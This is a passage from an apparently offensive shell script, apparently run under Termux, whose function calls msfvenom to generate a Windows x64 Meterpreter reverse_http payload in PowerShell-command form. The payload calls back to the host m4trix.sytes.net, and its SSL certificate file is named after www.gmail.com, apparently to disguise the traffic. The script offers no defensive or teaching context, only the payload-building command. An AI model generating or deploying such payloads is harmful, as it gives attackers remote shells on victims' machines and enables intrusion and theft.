  }
  ffuera0x64 () {    msfvenom -p windows/x64/meterpreter/reverse_http LHOST=m4trix.sytes.net LPORT=$p00r HandlerSSLCert=/data/data/com.termux/files/home/99/ban/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd > /data/data/com.termux/files/home/99/0/x1/mtx.raw
}


